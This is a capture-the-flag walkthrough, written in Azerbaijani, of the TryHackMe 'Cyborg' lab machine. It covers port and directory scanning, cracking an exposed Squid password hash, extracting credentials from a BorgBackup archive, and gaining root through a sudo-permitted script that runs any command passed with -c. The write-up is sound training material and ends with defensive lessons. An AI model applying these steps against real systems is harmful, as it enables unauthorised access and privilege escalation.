# TryHackMe — Cyborg Writeup (Azərbaycan dilində)

**Platforma:** TryHackMe  
**Otaq:** Cyborg  
**Çətinlik:** Asan  
**Keçirilən vaxt:** ~45 dəqiqə  
**Bacarıqlar:** Web enumeration, hash cracking, BorgBackup, privilege escalation  
**Link:** https://tryhackme.com/room/cyborgt8

---

## Məzmun

1. [Kəşfiyyat — Nmap Skan](#1-kəşfiyyat--nmap-skan)
2. [Web Enumeration — Gobuster](#2-web-enumeration--gobuster)
3. [Hash Tapma və Sındırma](#3-hash-tapma-və-sındırma)
4. [BorgBackup Arxivini Çıxartmaq](#4-borgbackup-arxivini-çıxartmaq)
5. [SSH ilə Giriş — User Flag](#5-ssh-ilə-giriş--user-flag)
6. [Privilege Escalation — Root Flag](#6-privilege-escalation--root-flag)
7. [Nəticə](#7-nəticə)

---

## 1. Kəşfiyyat — Nmap Skan

İlk addım hədəf maşında açıq portları tapmaqdan ibarətdir:

```bash
nmap -sV -sC -v <HEDEF_IP>
```

**Nəticə:**

| Port | Servis   |
|------|----------|
| 22   | SSH      |
| 80   | HTTP     |

Cəmi **2 açıq port** var.

---

## 2. Web Enumeration — Gobuster

Brauzer ilə `http://<HEDEF_IP>` açıldıqda standart Apache səhifəsi görünür. Gizli qovluqları tapmaq üçün Gobuster istifadə edirik:

```bash
gobuster dir -u http://<HEDEF_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Tapılan qovluqlar:**

- `/admin`
- `/etc`

### /admin qovluğu

`/admin` səhifəsindəki **Admins** bölməsində 3 istifadəçi adı var: **Josh, Adam, Alex**. Eyni zamanda bir backup arxivi mövcuddur.

### /etc qovluğu

`/etc/squid/passwd` faylında şifrə hash-i tapılır:

```
music_archive:$apr1$BpZ.Q7Im$aQlE4oi9yOTPA5rCS6Kek0
```

---

## 3. Hash Tapma və Sındırma

Hash-i `john` vasitəsilə sındırırıq:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Nəticə:**

```
squidward        (music_archive)
```

Şifrə: **`squidward`**

---

## 4. BorgBackup Arxivini Çıxartmaq

`/admin` bölməsindən `archive.tar` faylı yüklənir. Açdıqdan sonra bunun **BorgBackup** arxivi olduğu görünür.

### Arxivi siyahıla

```bash
borg list ./final_archive
```

Şifrə soruşulur → `squidward` yazılır.

**Nəticə:**

```
music_archive    Tue, 2020-12-29 09:00:38 [f789ddb6b0ec...]
```

### Snapshot içindəki faylları gör

```bash
borg list ./final_archive::music_archive
```

`home/alex` qovluğu görünür.

### Faylları çıxart

```bash
mkdir ~/extracted
cd ~/extracted
borg extract /path/to/final_archive::music_archive
```

Çıxarıldıqdan sonra `home/alex` qovluğunda `.config` faylında Alex-in SSH şifrəsi tapılır:

```
alex:S3cretValue2020
```

---

## 5. SSH ilə Giriş — User Flag

```bash
ssh alex@<HEDEF_IP>
```

Şifrə: `S3cretValue2020`

**User flag:**

```bash
cat ~/user.txt
```

---

## 6. Privilege Escalation — Root Flag

### Sudo icazələrini yoxla

```bash
sudo -l
```

**Nəticə:**

```
(ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

Alex şifrəsiz olaraq `backup.sh` skriptini root kimi işlədə bilir.

### Skriptin məzmununu oxu

```bash
cat /etc/mp3backups/backup.sh
```

Skriptdə `-c` parametri ilə ixtiyari əmr icra etmək mümkündür:

```bash
cmd=$($command)
echo $cmd
```

### İstismar

```bash
# Kimin olduğumuzu yoxla
sudo /etc/mp3backups/backup.sh -c "whoami"
# Nəticə: root

# Root flag-ı oxu
sudo /etc/mp3backups/backup.sh -c "cat /root/root.txt"
```

**Root flag əldə edildi!**

---

## 7. Nəticə

### İstifadə edilən texnikalar

| Addım                  | Alət / Metod              |
|------------------------|---------------------------|
| Port skanı             | Nmap                      |
| Qovluq axtarışı        | Gobuster                  |
| Hash sındırma          | John the Ripper           |
| Arxiv çıxartma         | BorgBackup (borg extract) |
| Giriş                  | SSH                       |
| Privilege Escalation   | Sudo + backup.sh -c flag  |

### Əldə edilən flaglar

- **User flag:** `user.txt` — Alex-in home qovluğunda
- **Root flag:** `root.txt` — `/root/` qovluğunda

### Öyrənilənlər

- HTTP serverində açıq qalan həssas fayllar (`/etc/squid/passwd`) ciddi təhlükədir.
- BorgBackup arxivlərinin şifrəsi zəif olarsa, içindəki məlumatlar ələ keçirilə bilər.
- `sudo` icazəsi verilmiş skriptlər düzgün yazılmasa, tam root girişi mümkündür.
- Fayl icazələri (`chmod`, `chown`) düzgün konfiqurasiya edilməlidir.

---

*Writeup müəllifi: CTF həvəskarı*  
*Tarix: 2026*
